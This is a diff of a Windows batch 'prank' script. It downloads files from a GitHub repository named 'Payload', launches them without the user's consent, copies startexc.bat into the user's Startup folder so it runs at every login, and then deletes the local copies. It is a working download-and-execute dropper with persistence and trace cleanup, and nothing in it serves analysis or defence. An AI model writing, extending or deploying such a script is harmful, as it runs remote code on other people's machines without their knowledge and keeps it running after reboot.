@@ -1,41 +1,66 @@
 @echo off
 setlocal
 
-:: Function to retry download
-:downloadFile
-set "url=%~1"
-set "target=%~2"
-:retry
-curl -O "%url%"
-if not exist "%target%" (
-    echo [Retry] Failed to download %target%. Retrying in 5 seconds...
-    timeout /t 5 > nul
-    goto retry
+:: Define retry delay (in seconds)
+set "retryDelay=5"
+
+:: Download talk2
+set "urlTalk2=https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2"
+set "fileTalk2=talk2"
+:retryTalk2
+curl -O "%urlTalk2%"
+if not exist "%fileTalk2%" (
+    echo [Retry] Failed to download %fileTalk2%. Retrying in %retryDelay% seconds...
+    timeout /t %retryDelay% > nul
+    goto retryTalk2
 )
-echo [OK] Downloaded %target%.
-goto :eof
+echo [OK] Downloaded %fileTalk2%
 
-:: Download each file with retry mechanism
-echo Downloading prank files...
-call :downloadFile https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2 talk2
-call :downloadFile https://raw.githubusercontent.com/DanielNov2014/Payload/main/sound.wav sound.wav
-call :downloadFile https://raw.githubusercontent.com/DanielNov2014/Payload/main/startexc.bat startexc.bat
+:: Download sound.wav
+set "urlSound=https://raw.githubusercontent.com/DanielNov2014/Payload/main/sound.wav"
+set "fileSound=sound.wav"
+:retrySound
+curl -O "%urlSound%"
+if not exist "%fileSound%" (
+    echo [Retry] Failed to download %fileSound%. Retrying in %retryDelay% seconds...
+    timeout /t %retryDelay% > nul
+    goto retrySound
+)
+echo [OK] Downloaded %fileSound%
 
-:: Launch the files
-timeout 10 > nul
+:: Download startexc.bat
+set "urlStart=https://raw.githubusercontent.com/DanielNov2014/Payload/main/startexc.bat"
+set "fileStart=startexc.bat"
+:retryStart
+curl -O "%urlStart%"
+if not exist "%fileStart%" (
+    echo [Retry] Failed to download %fileStart%. Retrying in %retryDelay% seconds...
+    timeout /t %retryDelay% > nul
+    goto retryStart
+)
+echo [OK] Downloaded %fileStart%
+
+:: Execute prank
+timeout /t 10 > nul
 start "" startexc.bat
 start "" sound.wav
 start "" talk2.vbs
 
-:: Check if talk2.vbs launched (optional)
-timeout 3 > nul
+:: Wait and check process
+timeout /t 3 > nul
 tasklist | findstr /i "wscript.exe" > nul
 if errorlevel 1 (
     echo [Warning] talk2.vbs may not have started properly.
 )
 
+:: Copy to Startup folder for auto-launch
+set "startupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+copy /y startexc.bat "%startupPath%\startexc.bat"
+echo [OK] startexc.bat added to Startup folder 😈
+
 :: Cleanup
-timeout 5 > nul
+timeout /t 5 > nul
 if exist talk.vbs (
     del /f /q "talk.vbs"
     echo Deleted talk.vbs
@@ -45,5 +70,5 @@ if exist startexc.bat (
     echo Deleted startexc.bat
 )
 
-echo Done. Mission complete. 😈
+echo Done. All files downloaded, executed, and cleaned up. 🎭
 endlocal
